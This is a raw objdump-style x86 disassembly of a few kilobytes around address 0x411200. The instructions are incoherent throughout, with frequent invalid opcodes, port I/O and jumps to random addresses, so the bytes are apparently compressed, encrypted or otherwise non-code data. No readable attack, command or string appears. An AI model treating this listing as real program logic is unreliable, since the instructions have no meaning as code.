  41127c:	loope  0x41126c
  41127e:	(bad)  
  41127f:	(bad)  
  411281:	test   al,0xdd
  411283:	enter  0xebf7,0xbc
  411287:	iret   
  411288:	cmc    
  411289:	(bad)  
  41128a:	in     eax,0xcb
  41128c:	clc    
  41128d:	(bad)  
  41128f:	jmp    0x411250
  411291:	(bad)  
  411292:	mov    esi,0xec06f1d5
  411297:	fldpi  
  411299:	or     ah,dh
  41129b:	add    ecx,DWORD PTR [ecx]
  41129d:	loopne 0x411286
  41129f:	out    0xc0,eax
  4112a1:	out    dx,eax
  4112a2:	mov    ebp,0xdccfe0c1
  4112a7:	mov    cl,0xb4
  4112a9:	in     al,0xbb
  4112ab:	call   0xb930068e
  4112b0:	ret    0xecb8
  4112b3:	loop   0x41126d
  4112b5:	add    dl,al
  4112b7:	mov    DWORD PTR [ebx],0xdff4c9fd
  4112bd:	into   
  4112be:	or     dh,bl
  4112c0:	(bad)  [esi-0xa53393b]
  4112c6:	mov    bl,0xef
  4112c8:	mov    al,0xf0
  4112ca:	int3   
  4112cb:	mov    dh,0xd2
  4112cd:	fdivrp st(5),st
  4112cf:	jmp    0x4112bd
  4112d1:	out    dx,al
  4112d2:	repnz (bad) 
  4112d5:	rcl    esp,0xf5
  4112d8:	sti    
  4112d9:	loop   0x4112ba
  4112db:	test   esp,0xe7e8ceec
  4112e1:	mov    ebp,0xd2b7b7c0
  4112e6:	loop   0x41129d
  4112e8:	cli    
  4112e9:	jmp    0xd92acae7
  4112ee:	mov    dh,0xd6
  4112f0:	mov    ecx,0xf4bdffe8
  4112f5:	repz (bad) 
  4112f7:	mov    ecx,0x9e0eafc
  4112fc:	ror    bl,0xd9
  4112ff:	adc    esp,ebx
  411301:	jecxz  0x4112ed
  411303:	(bad)  
  411304:	jmp    0x4112d5
  411306:	jmp    0xd93a09f8
  41130b:	ror    cl,1
  41130d:	mov    esi,0xf3fefffc
  411312:	mov    esi,0xd201f6c3
  411317:	clc    
  411318:	rcl    edi,0x0
  41131b:	stc    
  41131c:	iret   
  41131d:	mov    DWORD PTR ds:0xeeddc905,0xb7ece6d7
  411327:	out    0xcb,al
  411329:	(bad)  
  41132a:	repz jmp 0xc1cd:0xb4fbfbd3
  411332:	repnz fld st(6)
  411335:	int    0xd1
  411337:	cli    
  411338:	(bad)  
  411339:	rol    BYTE PTR [eax],1
  41133b:	fcmovnu st,st(0)
  41133d:	cld    
  41133e:	push   es
  41133f:	out    dx,eax
  411340:	jmp    0xcc18c223
  411345:	ret    0xc6e1
  411348:	enter  0xc0d1,0xf8
  41134c:	shl    DWORD PTR [ebx-0xf321305],cl
  411352:	int    0xcf
  411354:	mov    edi,0xb8d4e0d7
  411359:	call   0xea271e1c
  41135e:	retf   
  41135f:	sti    
  411360:	out    dx,eax
  411361:	test   al,0xdd
  411363:	lods   eax,DWORD PTR ds:[esi]
  411364:	jmp    0xc3230a52
  411369:	shl    esp,1
  41136b:	fidiv  WORD PTR [ebx+ebp*8-0x3d10122f]
  411372:	out    dx,al
  411373:	jecxz  0x411368
  411375:	lds    eax,FWORD PTR [eax]
  411377:	(bad)  
  411378:	sti    
  411379:	add    eax,0xfd09f6c2
  41137e:	loopne 0x41134d
  411380:	cld    
  411381:	les    esi,FWORD PTR [eax-0x9183d2d]
  411387:	mov    bh,0xcf
  411389:	mov    ch,0xd2
  41138b:	mov    ch,0xac
  41138d:	repnz retf 0xccd2
  411391:	lock add esp,edx
  411394:	into   
  411395:	add    bl,al
  411397:	rcl    bh,1
  411399:	(bad)  
  41139a:	jmp    0x411387
  41139c:	pop    es
  41139d:	fucomp st(7)
  41139f:	in     eax,dx
  4113a0:	or     ebp,ebp
  4113a2:	into   
  4113a3:	ret    0xe7b3
  4113a6:	jecxz  0x411373
  4113a8:	jmp    0xca1202a4
  4113ad:	retf   0xefda
  4113b0:	mov    eax,0x5fdf1f0
  4113b5:	pop    es
  4113b6:	(bad)  
  4113b8:	fsubp  st(0),st
  4113ba:	(bad)  
  4113bb:	retf   0x2e1
  4113be:	pop    es
  4113bf:	(bad)  
  4113c1:	rol    dh,1
  4113c3:	loope  0x411386
  4113c5:	out    0xf2,al
  4113c7:	out    dx,al
  4113c8:	enter  0xfbea,0xfa
  4113cc:	repnz xlat BYTE PTR ds:[ebx]
  4113ce:	fcmovnb st,st(3)
  4113d0:	fcmovne st,st(1)
  4113d2:	int3   
  4113d3:	rcl    ecx,0xda
  4113d6:	fcmovu st,st(7)
  4113d8:	jmp    0x4113a4
  4113da:	cmc    
  4113db:	add    eax,0xfecdcada
  4113e0:	fcmove st,st(2)
  4113e2:	in     eax,dx
  4113e3:	div    edx
  4113e5:	jmp    0xbfe7:0xe5e4e7ed
  4113ec:	idiv   ebp
  4113ee:	shl    bl,cl
  4113f0:	sar    esp,1
  4113f2:	ret    
  4113f3:	repnz loop 0x4113da
  4113f6:	(bad)  
  4113f7:	jmp    0x4113bd
  4113f9:	mul    ah
  4113fb:	std    
  4113fc:	cld    
  4113fd:	loopne 0x4113cd
  4113ff:	retf   0xcaec
  411402:	repnz in al,dx
  411404:	lods   al,BYTE PTR ds:[esi]
  411405:	iret   
  411406:	loope  0x4113e3
  411408:	int3   
  411409:	call   0xdd32ebe2
  41140e:	mov    dh,0xba
  411410:	mov    edx,0xecc7b9bb
  411415:	stc    
  411416:	stc    
  411417:	hlt    
  411418:	out    0xdf,eax
  41141a:	lock (bad) [edi]
  41141d:	out    0xfa,al
  41141f:	in     al,0xe8
  411421:	mov    bl,0xc2
  411423:	retf   0xf0ea
  411426:	call   0xca12fcf8
  41142b:	(bad)  
  41142c:	stc    
  41142d:	out    dx,eax
  41142e:	mov    ch,0xde
  411430:	retf   0xf9f4
  411433:	rcr    edx,cl
  411435:	ret    
  411436:	in     al,0xf8
  411438:	pop    es
  411439:	(bad)  
  41143a:	out    0x1,al
  41143c:	or     bh,al
  41143e:	loop   0x41142e
  411440:	or     ebp,ebx
  411442:	mov    ebp,0xe4b0d1ef
  411447:	mov    dh,0xb1
  411449:	mov    ah,0xca
  41144b:	call   0xff391016
  411450:	out    dx,al
  411451:	(bad)  
  411452:	aam    0xe2
  411454:	mov    edi,0xd0bcbcc6
  411459:	lock enter 0xeef4,0xfe
  41145e:	or     edx,ebx
  411460:	stc    
  411461:	jecxz  0x411455
  411463:	scas   al,BYTE PTR es:[edi]
  411464:	int    0xdd
  411466:	into   
  411467:	jmp    0x41142b
  411469:	call   0xd62fcc1c
  41146e:	jmp    0x411429
  411470:	mov    esp,0xccbfcdf4
  411475:	cld    
  411476:	neg    ah
  411478:	rcr    bh,cl
  41147a:	loop   0x41145c
  41147c:	into   
  41147d:	retf   0xe9ff
  411480:	shl    DWORD PTR [ecx-0x34335040],cl
  411486:	in     al,0xe9
  411488:	repnz jmp 0xdcba:0xd8cde7d2
  411490:	jecxz  0x41146f
  411492:	cmc    
  411493:	stc    
  411494:	aam    0xc0
  411496:	loop   0x41147b
  411498:	icebp  
  411499:	retf   0xc5d0
  41149c:	cmc    
  41149d:	in     eax,0xb
  41149f:	fcmovnu st,st(5)
  4114a1:	(bad)  
  4114a2:	leave  
  4114a3:	lock out 0xf6,eax
  4114a6:	fsub   st(0),st
  4114a8:	in     al,0xf4
  4114aa:	cmc    
  4114ab:	(bad)  
  4114ac:	jmp    0xf317f479
  4114b1:	add    edi,DWORD PTR [ecx-0x4200fdf9]
  4114b7:	fucom  st(4)
  4114b9:	in     al,0xe3
  4114bb:	cli    
  4114bc:	sti    
  4114bd:	fiadd  WORD PTR [edx+ecx*8]
  4114c0:	jmp    0xef2a0c77
  4114c5:	out    dx,eax
  4114c6:	leave  
  4114c7:	(bad)  
  4114c8:	stc    
  4114c9:	icebp  
  4114ca:	stc    
  4114cb:	fnstcw WORD PTR [edi-0x462b0707]
  4114d1:	call   0xee0804c5
  4114d6:	rol    BYTE PTR [eax+edi*8],1
  4114d9:	or     esp,eax
  4114db:	(bad)  
  4114dc:	dec    DWORD PTR [esi]
  4114de:	sti    
  4114df:	in     al,dx
  4114e0:	out    0xc1,al
  4114e2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114e4:	out    dx,al
  4114e5:	jmp    0xf135e39e
  4114ea:	lock int3 
  4114ec:	call   ebp
  4114ee:	(bad)  
  4114ef:	frndint 
  4114f1:	std    
  4114f2:	out    0xda,eax
  4114f4:	mov    DWORD PTR [edi],0xf5f4d6
  4114fa:	cli    
  4114fb:	mov    BYTE PTR [esi],0xcf
  4114fe:	cli    
  4114ff:	jmp    0x4114e9
  411501:	(bad)  
  411502:	enter  0xe2c2,0xf6
  411506:	int3   
  411507:	ret    
  411508:	xlat   BYTE PTR ds:[ebx]
  411509:	mov    cl,0xef
  41150b:	fldz   
  41150d:	sti    
  41150e:	call   0xde04d0db
  411513:	sti    
  411514:	cli    
  411515:	cld    
  411516:	fcmovu st,st(5)
  411518:	in     eax,0xc6
  41151a:	std    
  41151b:	fimul  WORD PTR ds:0xebdfcde4
  411521:	fnstsw WORD PTR [eax-0x12282841]
  411527:	ret    
  411528:	sar    al,1
  41152a:	(bad)  
  41152b:	clc    
  41152c:	repnz (bad) 
  41152e:	(bad)  
  411530:	call   0xc43df42c
  411535:	mov    edi,0xf8d8d6e2
  41153a:	les    eax,FWORD PTR [eax]
  41153c:	or     eax,0xd9f3e8e7
  411541:	loop   0x411521
  411543:	test   al,0xbc
  411545:	(bad)  
  411546:	loope  0x411508
  411548:	jmp    0xb7f1f603
  41154d:	mov    edi,0xe8d3fbbc
  411552:	(bad)  
  411553:	mov    edi,0xd7fd01c0
  411558:	out    0xde,al
  41155a:	mov    esi,0x8e8dcc1
  41155f:	add    al,0xf1
  411561:	leave  
  411562:	(bad)
  411565:	jmp    0x411519
  411567:	sti    
  411568:	shl    esp,0xc5
  41156b:	in     al,0xbb
  41156d:	fnstcw WORD PTR [ebp+0x7dbdaeb]
  411573:	jecxz  0x411541
  411575:	out    0x0,eax
  411577:	loop   0x411574
  411579:	(bad)  
  41157b:	fmul   QWORD PTR [edx]
  41157d:	ret    
  41157e:	add    ebx,ebp
  411580:	out    dx,al
  411581:	(bad)  
  411582:	int3   
  411583:	lock retf 
  411585:	mov    cl,0xc7
  411587:	cli    
  411588:	mov    edx,0xcfd4cef0
  41158d:	dec    dh
  41158f:	into   
  411590:	ror    ecx,1
  411592:	shl    dl,0xf7
  411595:	out    0xf6,al
  411597:	pop    es
  411598:	aad    0xd4
  41159a:	test   ebx,0xdffdf9da
  4115a0:	add    ecx,ecx
  4115a2:	mov    ebp,0xdcc6c1ad
  4115a7:	mov    bh,0xe5
  4115a9:	les    ebp,FWORD PTR [esi-0x45114f10]
  4115af:	std    
  4115b0:	in     al,dx
  4115b1:	jmp    0xc43de888
  4115b6:	(bad)  
  4115b7:	mov    ebp,0xc4c103e6
  4115bc:	out    0xea,eax
  4115be:	(bad)  
  4115c0:	out    0xb9,al
  4115c2:	retf   0xe9ec
  4115c5:	lock ret 
  4115c7:	into   
  4115c8:	lods   al,BYTE PTR ds:[esi]
  4115c9:	mov    ch,0xc8
  4115cb:	mov    dh,0xf2
  4115cd:	mov    ebx,0xbcbecbd7
  4115d2:	mov    ecx,0xdff5d8e0
  4115d7:	ffreep st(4)
  4115d9:	fsub   st,st(5)
  4115db:	push   es
  4115dc:	loopne 0x4115c6
  4115de:	fcmovnb st,st(5)
  4115e0:	fmul   st,st(5)
  4115e2:	fucom  st(3)
  4115e4:	(bad)  
  4115e5:	iret   
  4115e6:	leave  
  4115e7:	fucomi st,st(2)
  4115e9:	mov    dh,0xbb
  4115eb:	(bad)  
  4115ec:	mov    ah,0xc5
  4115ee:	(bad)  
  4115f0:	mov    edx,0xe703ccdd
  4115f5:	(bad)  
  4115f6:	mov    edx,0xddc4c4f0
  4115fb:	push   cs
  4115fc:	leave  
  4115fd:	jmp    0xc2a9:0xc6fadae9
  411604:	shl    esi,0xcf
  411607:	(bad)  
  411608:	int    0xec
  41160a:	fistp  QWORD PTR [edi-0x5371509]
  411610:	fdivr  DWORD PTR [ebp+edx*8-0x233c4006]
  411617:	sti    
  411618:	les    eax,FWORD PTR [edi]
  41161a:	add    eax,0xf4d4fbc5
  41161f:	iret   
  411620:	shl    ebx,cl
  411622:	icebp  
  411623:	(bad)  [eax-0x1d3a1120]
  411629:	in     eax,dx
  41162a:	mov    dh,0xf6
  41162c:	call   0xf70e0f2e
  411631:	hlt    
  411632:	icebp  
  411633:	int    0x1
  411635:	fcom   st(0)
  411637:	(bad)  
  411638:	aad    0xe2
  41163a:	pop    es
  41163b:	or     eax,eax
  41163d:	fsub   st(1),st
  41163f:	add    al,ah
  411641:	(bad)
  411644:	retf   
  411645:	out    0xca,eax
  411647:	test   eax,0xf4e8e8d9
  41164c:	in     al,0xf4
  41164e:	add    ebp,ebp
  411650:	add    DWORD PTR [ebx],eax
  411652:	out    0xfd,eax
  411654:	(bad)  
  411656:	add    edx,edi
  411658:	fxch   st(2)
  41165a:	in     al,0xee
  41165c:	hlt    
  41165d:	cld    
  41165e:	repz out 0xcb,eax
  411661:	repz rol ebx,0xec
  411665:	mov    ch,0xd6
  411667:	in     eax,0xe4
  411669:	div    BYTE PTR [ecx-0x36224a37]
  41166f:	jmp    0x22ff824
  411674:	out    0xe4,eax
  411676:	std    
  411677:	frndint 
  411679:	or     bh,dl
  41167b:	fmul   QWORD PTR ds:0xe309e5d8
  411681:	icebp  
  411682:	fdiv   st,st(6)
  411684:	mov    dh,0xc0
  411686:	int3   
  411687:	repz rcl edi,0xff
  41168b:	mov    ah,0xf5
  41168d:	aam    0xed
  41168f:	int3   
  411690:	into   
  411691:	aad    0xcd
  411693:	xbegin 0x47ec70
  411699:	jmp    0xc8e6:0xc4efbddb
  4116a0:	jmp    0xf732e987
  4116a5:	(bad)  
  4116a6:	int    0xda
  4116a8:	cmc    
  4116a9:	out    0xb8,eax
  4116ab:	jmp    0x4116ab
  4116ad:	shr    edi,cl
  4116af:	mov    esi,0x2c2d0e2
  4116b4:	out    0xf6,eax
  4116b6:	rcr    bl,0xe7
  4116b9:	add    BYTE PTR [edi],al
  4116bb:	add    cl,ah
  4116bd:	add    esi,eax
  4116bf:	sti    
  4116c0:	rcl    dl,0xe6
  4116c3:	rol    dl,cl
  4116c5:	mov    bh,0xea
  4116c7:	retf   0xf1db
  4116ca:	(bad)
  4116ce:	add    edi,eax
  4116d0:	ret    
  4116d1:	sti    
  4116d2:	in     eax,dx
  4116d3:	int    0x6
  4116d5:	(bad)  
  4116d6:	in     eax,0xc4
  4116d8:	rol    eax,0xef
  4116db:	hlt    
  4116dc:	fucomip st,st(4)
  4116de:	retf   0xed04
  4116e1:	jecxz  0x4116ae
  4116e3:	out    dx,al
  4116e4:	mov    bl,0xcb
  4116e6:	scas   al,BYTE PTR es:[edi]
  4116e7:	out    0xb2,eax
  4116e9:	jmp    0xb6f912ce
  4116ee:	in     al,dx
  4116ef:	jecxz  0x4116cd
  4116f1:	rcr    eax,1
  4116f3:	not    ebx
  4116f5:	loopne 0x4116eb
  4116f7:	rcl    esi,0xd0
  4116fa:	clc    
  4116fb:	add    cl,cl
  4116fd:	cld    
  4116fe:	retf   0xf905
  411701:	scas   al,BYTE PTR es:[edi]
  411702:	loope  0x4116e1
  411704:	shl    BYTE PTR [ebx-0x292f5629],0xc7
  41170b:	call   0x430dfca
  411710:	mov    esi,0xe1e6e7d1
  411715:	(bad)  
  411716:	stc    
  411717:	stc    
  411718:	or     al,dh
  41171a:	xlat   BYTE PTR ds:[ebx]
  41171b:	(bad)  
  41171d:	(bad)  
  41171f:	int3   
  411720:	add    dh,cl
  411722:	leave  
  411723:	retf   0xc5e6
  411726:	loopne 0x4116f9
  411728:	int    0xf4
  41172a:	call   ebx
  41172c:	f2xm1  
  41172e:	jmp    0xd1e3:0xba02d5ed
  411735:	std    
  411736:	cli    
  411737:	add    bh,BYTE PTR [eax-0x10ff083b]
  41173d:	or     eax,0xabf309f8
  411742:	in     al,dx
  411743:	in     al,dx
  411744:	(bad)
  411747:	icebp  
  411748:	mov    dl,0xfa
  41174a:	repnz (bad) 
  41174c:	out    0xf5,al
  41174e:	aad    0xb4
  411750:	xlat   BYTE PTR ds:[ebx]
  411751:	loope  0x411750
  411753:	cmc    
  411754:	int    0xd4
  411756:	std    
  411757:	rcr    bh,0x6
  41175a:	pop    es
  41175b:	or     DWORD PTR [edx],ecx
  41175d:	(bad)  
  41175e:	call   0xe4f5016d
  411763:	out    0xf0,eax
  411765:	rcl    dl,cl
  411767:	xlat   BYTE PTR ds:[ebx]
  411768:	repz in eax,dx
  41176a:	mov    edx,0xc4eceab6
  41176f:	fcmovu st,st(7)
  411771:	out    dx,al
  411772:	fdivp  st(2),st
  411774:	cli    
  411775:	mul    bl
  411777:	ret    0x6c6
  41177a:	leave  
  41177b:	add    ch,ah
  41177d:	add    al,0xdb
  41177f:	retf   0xc4ea
  411782:	in     al,0xf0
  411784:	mov    bl,0xdc
  411786:	shr    dl,cl
  411788:	fcmove st,st(6)
  41178a:	cmc    
  41178b:	into   
  41178c:	into   
  41178d:	cli    
  41178e:	iret   
  41178f:	div    DWORD PTR [eax-0x71e1138]
  411795:	ret    
  411796:	xlat   BYTE PTR ds:[ebx]
  411797:	(bad)  
  411799:	(bad)  
  41179b:	mov    ebp,0xe8d4f5e6
  4117a0:	jecxz  0x41174a
  4117a2:	shr    BYTE PTR [ecx-0x40a2f4f],1
  4117a8:	shl    BYTE PTR [eax+edi*4-0x9103b47],1
  4117af:	mov    eax,0x601b7d3
  4117b4:	push   es
  4117b5:	aad    0xf1
  4117b7:	push   es
  4117b8:	cmc    
  4117b9:	jecxz  0x4117b5
  4117bb:	(bad)  
  4117bd:	in     al,dx
  4117be:	std    
  4117bf:	out    0xe6,eax
  4117c1:	fsubr  DWORD PTR [edi-0x83f0d13]
  4117c7:	aad    0xdb
  4117c9:	enter  0xadda,0xc5
  4117cd:	rol    BYTE PTR [ebx],cl
  4117cf:	leave  
  4117d0:	loope  0x4117d0
  4117d2:	mov    esi,0xc3c6c7b9
  4117d7:	fcomip st,st(2)
  4117d9:	fisttp QWORD PTR [eax]
  4117db:	in     eax,0xc5
  4117dd:	iret   
  4117de:	push   cs
  4117df:	fld    DWORD PTR [esi]
  4117e1:	call   0xd50cd4d9
  4117e6:	cmc    
  4117e7:	loopne 0x41179c
  4117e9:	(bad)  
  4117ea:	out    dx,al
  4117eb:	mov    dh,0xb8
  4117ed:	aad    0xce
  4117ef:	mov    ebx,0xdee2f7f9
  4117f4:	fsub   st(4),st
  4117f6:	rol    ebp,0xdf
  4117f9:	jmp    0xeb2219dc
  4117fe:	or     bh,al
  411800:	rol    ah,0xe8
  411803:	ret    
  411804:	out    dx,eax
  411805:	iret   
  411806:	mov    esp,0xb7eed1e7
  41180c:	in     eax,dx
  41180d:	(bad)
  411810:	ret    
  411811:	int    0xf1
  411813:	shl    eax,0xdb
  411816:	out    0xf4,eax
  411818:	fsubr  st,st(0)
  41181a:	(bad)  
  41181b:	sti    
  41181c:	in     eax,0xcb
  41181e:	stc    
  41181f:	adc    eax,esp
  411821:	jmp    0xe3c2:0xc5c1f3ca
  411828:	loopne 0x411818
  41182a:	in     al,0xbb
  41182c:	fld    st(5)
  41182e:	sar    DWORD PTR [edi-0x40022607],cl
  411834:	cld    
  411835:	int3   
  411836:	add    al,0xfe
  411838:	cli    
  411839:	in     al,0xeb
  41183b:	retf   
  41183c:	add    BYTE PTR [ebx],cl
  41183e:	loopne 0x411826
  411840:	or     ch,bl
  411842:	mov    dl,0xe0
  411844:	leave  
  411845:	repz out 0xfa,al
  411848:	imul   BYTE PTR [edi-0x11163a1c]
  41184e:	xlat   BYTE PTR ds:[ebx]
  41184f:	fldl2t 
  411851:	clc    
  411852:	rcr    esi,0x5
  411855:	in     al,0xb
  411857:	fcomip st,st(7)
  411859:	mov    DWORD PTR [ecx],0xfdf5fbfd
  41185f:	jmp    0x411868
  411861:	mov    cl,0xa6
  411863:	retf   
  411864:	rol    ah,1
  411866:	xlat   BYTE PTR ds:[ebx]
  411867:	hlt    
  411868:	in     eax,0xdb
  41186a:	in     eax,0xed
  41186c:	enter  0xcbb4,0xce
  411870:	mov    edi,0xd202bcd0
  411875:	repz fadd QWORD PTR [eax]
  411878:	fdecstp 
  41187a:	add    edi,edi
  41187c:	fstp   st(2)
  41187e:	in     al,0xc5
  411880:	add    eax,0xd7c6f1de
  411885:	mov    ebp,0xc1b2e7b3
  41188a:	mov    eax,0x3f6c5f9
  41188f:	fnstsw WORD PTR [edx-0x31230f2d]
  411895:	mov    edi,0x5f2c6
  41189b:	add    dh,al
  41189d:	or     ch,ch
  41189f:	fcmovnb st,st(0)
  4118a1:	repnz shl bh,cl
  4118a4:	mov    bl,0xd4
  4118a6:	in     eax,dx
  4118a7:	(bad)
  4118aa:	sar    cl,0xd4
  4118ad:	int    0xdf
  4118af:	mov    ch,0xbc
  4118b1:	xlat   BYTE PTR ds:[ebx]
  4118b2:	out    0xbe,eax
  4118b4:	(bad)  
  4118b5:	mov    esp,0xe2c204eb
  4118ba:	or     ebp,esi
  4118bc:	aad    0xb
  4118be:	loop   0x4118a5
  4118c0:	iret   
  4118c1:	scas   eax,DWORD PTR es:[edi]
  4118c2:	icebp  
  4118c3:	in     eax,dx
  4118c4:	loope  0x41189d
  4118c6:	ret    
  4118c7:	lods   al,BYTE PTR ds:[esi]
  4118c8:	jmp    0x4118a3
  4118ca:	iret   
  4118cb:	sar    edi,1
  4118cd:	into   
  4118ce:	mov    edx,0xf4bdf303
  4118d3:	call   esi
  4118d5:	add    dl,al
  4118d7:	add    esi,esp
  4118d9:	fmul   QWORD PTR [eax]
  4118db:	(bad)
  4118de:	add    ch,cl
  4118e0:	add    bl,bh
  4118e2:	xlat   BYTE PTR ds:[ebx]
  4118e3:	test   eax,0xdab6e9de
  4118e8:	cli    
  4118e9:	shl    ecx,cl
  4118eb:	out    dx,al
  4118ec:	jmp    0xc00feded
  4118f1:	mov    edx,0xd9f3e7fa
  4118f6:	add    al,0xfc
  4118f8:	jecxz  0x4118fd
  4118fa:	aad    0xf6
  4118fc:	aam    0xe
  4118fe:	into   
  4118ff:	fiadd  DWORD PTR [edx]
  411901:	retf   
  411902:	out    0xec,eax
  411904:	into   
  411905:	repz repz sti 
  411908:	in     eax,dx
  411909:	test   esi,0xf3c4fedf
  41190f:	(bad)  
  411910:	fadd   DWORD PTR [ebx]
  411912:	(bad)  
  411913:	mov    esp,0xc1d2fdd0
  411918:	add    ah,bl
  41191a:	fdivr  st,st(4)
  41191c:	sti    
  41191d:	call   0xbe3de502
  411922:	lock out 0xf6,eax
  411925:	jecxz  0x411915
  411927:	call   0xbb0bcaf3
  41192c:	hlt    
  41192d:	(bad)
  411930:	(bad)  
  411932:	test   esp,0xe3c5dff0
  411938:	fcmovbe st,st(4)
  41193a:	aad    0xd8
  41193c:	add    cl,dh
  41193e:	repz fucom st(1)
  411941:	lock jmp 0x4118e9
  411944:	into   
  411945:	jmp    0x4118f9
  411947:	mov    dh,0xcf
  411949:	clc    
  41194a:	int    0xfe
  41194c:	xlat   BYTE PTR ds:[ebx]
  41194d:	out    dx,al
  41194e:	in     al,0xb1
  411950:	ret    0xfcd2
  411953:	cli    
  411954:	shl    al,cl
  411956:	(bad)  
  411957:	(bad)  
  411959:	(bad)  
  41195b:	cli    
  41195c:	jmp    0xe5cc:0xdcdfefda
  411963:	int    0xbe
  411965:	lods   al,BYTE PTR ds:[esi]
  411966:	aad    0xd7
  411968:	mov    cl,0xcb
  41196a:	out    0xc9,al
  41196c:	jmp    0xf5f6:0xffd7f4cf
  411973:	out    0xe0,al
  411975:	shl    ah,cl
  411977:	mov    ecx,0xeebde00
  41197c:	dec    edi
  41197e:	stc    
  41197f:	out    0xda,eax
  411981:	rol    esi,cl
  411983:	out    0xe0,al
  411985:	out    dx,eax
  411986:	cmc    
  411987:	repnz leave 
  411989:	cli    
  41198a:	rcl    ah,cl
  41198c:	mov    esi,0xd7f3bbbd
  411991:	fld    DWORD PTR [ebx]
  411993:	fucom  st(3)
  411995:	fadd   st(3),st
  411997:	jecxz  0x411996
  411999:	cld    
  41199a:	aam    0xe4
  41199c:	fcompp 
  41199e:	jmp    0xb931e1a7
  4119a3:	lods   al,BYTE PTR ds:[esi]
  4119a4:	(bad)  
  4119a5:	enter  0xb5c3,0xb6
  4119a9:	shl    al,1
  4119ab:	test   al,0xf1
  4119ae:	mov    edx,0xc201cfed
  4119b3:	not    esp
  4119b5:	out    0xd7,al
  4119b7:	jmp    0x41197d
  4119b9:	add    ch,cl
  4119bb:	std    
  4119bc:	stc    
  4119bd:	add    al,0xe1
  4119bf:	jmp    0xc8ede8a6
  4119c4:	mov    dh,0xf4
  4119c6:	stos   BYTE PTR es:[edi],al
  4119c7:	(bad)  
  4119c8:	in     al,0xea
  4119ca:	in     al,dx
  4119cb:	(bad)  
  4119cc:	fstp   TBYTE PTR [ecx-0x25fd2937]
  4119d2:	rcl    ebp,1
  4119d4:	fadd   QWORD PTR [ebx]
  4119d6:	add    esi,ebx
  4119d8:	add    dh,bh
  4119da:	test   edi,0x3fdc906
  4119e0:	out    dx,eax
  4119e1:	mov    ebp,0xcaedafb0
  4119e6:	lods   eax,DWORD PTR ds:[esi]
  4119e7:	shl    al,cl
  4119e9:	in     al,dx
  4119ea:	mov    dh,0xe4
  4119ed:	fcomp  st(0)
  4119ef:	shl    bh,1
  4119f1:	mov    edx,0xc1de03da
  4119f6:	mov    esp,0xefc6ffe7
  4119fb:	xlat   BYTE PTR ds:[ebx]
  4119fc:	retf   0xcad5
  4119ff:	push   es
  411a00:	out    dx,al
  411a01:	rcr    ebp,cl
  411a03:	int3   
  411a04:	mov    bl,0xaf
  411a06:	fcmovne st,st(6)
  411a08:	out    0xc1,al
  411a0a:	shr    ebp,cl
  411a0c:	cli    
  411a0d:	(bad)  
  411a0f:	mov    edx,0xbcdeefff
  411a14:	rcr    bl,0xdd
  411a17:	loop   0x4119ff
  411a19:	std    
  411a1a:	add    esi,esp
  411a1c:	push   cs
  411a1d:	out    0xe5,eax
  411a1f:	or     al,0x5
  411a21:	loope  0x411a06
  411a23:	into   
  411a24:	shl    DWORD PTR [esi-0x48443a2a],1
  411a2a:	xlat   BYTE PTR ds:[ebx]
  411a2b:	mov    edx,0xfee4eefb
  411a30:	mov    eax,0xe5b5c2f7
  411a35:	neg    edx
  411a37:	test   BYTE PTR [ecx],0xf4
  411a3a:	mul    al
  411a3c:	jmp    0xda310026
  411a41:	shl    cl,1
  411a43:	(bad)
  411a46:	in     al,dx
  411a47:	shl    eax,1
  411a49:	cmc    
  411a4a:	lock (bad) 
  411a4c:	(bad)  
  411a4e:	fdivr  DWORD PTR [edi-0x190e1d28]
  411a54:	sti    
  411a55:	int3   
  411a56:	add    al,0xf1
  411a58:	loopne 0x411a4b
  411a5a:	retf   
  411a5b:	add    eax,0xe605f8da
  411a60:	enter  0xadd9,0xd0
  411a64:	enter  0xfbe9,0xa9
  411a68:	jmp    0x411a24
  411a6a:	mov    ah,0xea
  411a6c:	mov    ch,0xfb
  411a6e:	fcmove st,st(0)
  411a70:	jmp    0xf527ec36
  411a75:	out    0xd9,eax
  411a77:	cld    
  411a78:	mov    BYTE PTR [ecx],0xb
  411a7b:	cld    
  411a7c:	sti    
  411a7d:	add    bl,dl
  411a7f:	repz fcomp st(6)
  411a82:	mov    ebp,0xc9c1b7e5
  411a87:	aad    0xcc
  411a89:	icebp  
  411a8a:	out    dx,al
  411a8b:	in     al,dx
  411a8c:	(bad)  
  411a8d:	shr    ebp,1
  411a8f:	rol    BYTE PTR [ecx],cl
  411a91:	in     al,dx
  411a92:	in     eax,dx
  411a93:	sar    BYTE PTR [ebp-0x3a0a202d],1
  411a99:	push   es
  411a9a:	ror    BYTE PTR [eax],1
  411a9c:	mov    esp,0xd3e3ce0f
  411aa1:	mov    esp,0xb2d2cef0
  411aa6:	jmp    0xd7d9:0xedd3c1f1
  411aad:	les    edi,FWORD PTR [eax-0x1d072c06]
  411ab3:	(bad)  
  411ab4:	fcomp  st(4)
  411ab6:	cld    
  411ab7:	loop   0x411ab3
  411ab9:	add    esi,edi
  411abb:	add    al,0xfc
  411abd:	retf   0xc9fd
  411ac0:	push   es
  411ac1:	(bad)  
  411ac2:	int    0xd2
  411ac4:	loop   0x411a7c
  411ac6:	(bad)  
  411ac7:	loop   0x411a95
  411ac9:	mov    al,0xb1
  411acb:	rcl    esp,cl
  411acd:	mov    bh,0xfa
  411acf:	sar    BYTE PTR [edi+edi*8-0xc320444],1
  411ad6:	add    bh,ch
  411ad8:	xlat   BYTE PTR ds:[ebx]
  411ad9:	add    eax,ebp
  411adb:	out    dx,eax
  411adc:	mov    esp,0xffee08ef
  411ae1:	mov    dl,0xd7
  411ae3:	mov    bl,0xae
  411ae5:	out    0xc5,al
  411ae7:	shl    ch,cl
  411ae9:	mov    bh,0xba
  411aeb:	out    0xf2,al
  411aed:	int    0xf9
  411aef:	in     eax,dx
  411af0:	fyl2x  
  411af2:	xlat   BYTE PTR ds:[ebx]
  411af3:	shl    ecx,cl
  411af5:	mov    BYTE PTR ds:0xbe08f5d7,0xfa
  411afc:	loope  0x411acc
  411afe:	into   
  411aff:	in     eax,dx
  411b00:	enter  0xe6ce,0xf3
  411b04:	enter  0xc0e5,0xcd
  411b08:	test   al,0xd6
  411b0a:	fxch   st(7)
  411b0c:	out    0xc9,al
  411b0e:	out    dx,al
  411b0f:	enter  0xfad6,0x2
  411b13:	mov    ch,0xdc
  411b15:	test   ebp,0xf8e8d80b
  411b1b:	aad    0xe1
  411b1d:	jecxz  0x411b06
  411b1f:	fsubr  st(5),st
  411b21:	test   al,0xe5
  411b23:	mov    dl,0xac
